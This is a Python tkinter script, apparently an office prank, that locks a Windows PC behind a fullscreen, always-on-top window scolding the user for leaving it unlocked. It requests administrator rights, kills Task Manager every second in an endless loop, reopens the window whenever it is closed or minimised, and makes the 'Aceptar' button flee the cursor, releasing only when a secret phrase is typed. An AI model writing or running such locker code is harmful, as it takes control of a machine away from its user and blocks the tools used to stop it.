import base64
from io import BytesIO
from PIL import Image, ImageTk
import tkinter as tk
import random
import os
import threading
import time
import sys
import ctypes
import subprocess

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def cerrar_programa():
    if is_admin():
        ti = 0
        while True:
            subprocess.run("taskkill /f /im Taskmgr.exe", shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
            ti += 1
            time.sleep(1)
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

thread = threading.Thread(target=cerrar_programa)
thread.start()
num_iteraciones = 0

def smooth_move_button(new_x, new_y, steps=40):
    step_x = (new_x - button.winfo_x()) / steps
    step_y = (new_y - button.winfo_y()) / steps

    for step in range(steps):
        top_level_window.after(step * 2, lambda step=step: button.place(x=max(0, min(top_level_window.winfo_width() - button.winfo_width(), button.winfo_x() + step * step_x)),
                                                                       y=max(0, min(top_level_window.winfo_height() - button.winfo_height(), button.winfo_y() + step * step_y))))

def move_button(event):
    button_x = button.winfo_x()
    button_y = button.winfo_y()
    button_width = button.winfo_width()
    button_height = button.winfo_height()

    cursor_x, cursor_y = event.x, event.y

    distance = ((button_x + button_width/2 - cursor_x)**2 + (button_y + button_height/2 - cursor_y)**2)**0.5

    if distance < 100:
        button_width = button.winfo_width()
        button_height = button.winfo_height()

        new_x = random.randint(0, top_level_window.winfo_width() - button_width)
        new_y = random.randint(0, top_level_window.winfo_height() - button_height)

        smooth_move_button(new_x, new_y)

def create_top_level_window():
    global top_level_window, window_position, button, tk_image, entry, num_iteraciones

    top_level_window = tk.Toplevel()
    top_level_window.title("Mensaje Importante")
    encoded_string = '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'
    decoded_image = base64.b64decode(encoded_string)
    image_data = BytesIO(decoded_image)
    img = Image.open(image_data)
    converted_img = img.convert('RGB')
    tk_image = ImageTk.PhotoImage(converted_img)
    num_iteraciones += 1
    width = 1920
    height = 1080
    x_position = int((width/2) - (width/2))
    y_position = int((height/2) - (height/2))
    window_position = f"+{x_position}+{y_position}"
    top_level_window.geometry(f"{width}x{height}")
    top_level_window.configure(bg="black")

    top_level_window.resizable(False, False)
    top_level_window.attributes('-topmost', True)
    top_level_window.attributes('-toolwindow', True)
    top_level_window.attributes('-fullscreen', True)

    label_principal = tk.Label(top_level_window, text="No debo dejar la PC desbloqueada", font=("Helvetica", 48), bg="black", fg="white")
    label_principal.pack(expand=True)
    
    label_secundaria = tk.Label(top_level_window, text="No hay nada que puedas hacer para cerrar el proceso a menos que sepas el nombre del archivo.", font=("Helvetica", 24), bg="black", fg="white")
    label_secundaria.pack(expand=True)
    
    label_final = tk.Label(top_level_window, text="Es posible que, aunque reinicies la PC, se vuelva a ejecutar la wea.", font=("Helvetica", 14), bg="black", fg="white")
    label_final.pack(expand=True)
    
    if num_iteraciones > 1:
        label_opcional = tk.Label(top_level_window, text="Escribí 'Debo traer panificados' en el campo de texto de abajo para cerrar el proceso.", font=("Helvetica", 14), bg="black", fg="white")
        label_opcional.pack(expand=True)
        
        entry = tk.Entry(top_level_window, font=("Helvetica", 14), bg="white", fg="black")
        entry.pack(expand=True)
        entry.focus()
        entry.bind('<Return>', verificar_frase)
    
    label_opcional_final = tk.Label(top_level_window, text="Fin.", font=("Helvetica", 14), bg="black", fg="white")
    label_opcional_final.pack(expand=True)
     
    button = tk.Button(top_level_window, text="Aceptar", image=tk_image, borderwidth=0, highlightthickness=0, takefocus=False, command=lambda: [top_level_window.destroy(), on_close2()])
    button.place(x=width/2, y=height/2)

    top_level_window.protocol("WM_DELETE_WINDOW", lambda: [top_level_window.destroy(), on_close()])

    top_level_window.bind('<Configure>', on_move)
    top_level_window.bind('<Unmap>', on_minimize)
    top_level_window.bind('<Motion>', move_button)
    
def verificar_frase(event=None):
    frase_ingresada = entry.get().lower()
    frase_correcta = "debo traer panificados"

    if frase_ingresada == frase_correcta:
        os._exit(0)

def on_move(event):
    global window_position
    current_position = f"+{top_level_window.winfo_x()}+{top_level_window.winfo_y()}"
    if current_position != window_position:
        top_level_window.geometry(window_position)

def on_minimize(event):
    top_level_window.deiconify()

def on_close():
    root.after(100, create_top_level_window)
    
def on_close2():
    root.after(5000, create_top_level_window)

root = tk.Tk()
root.withdraw()

create_top_level_window()

root.mainloop()
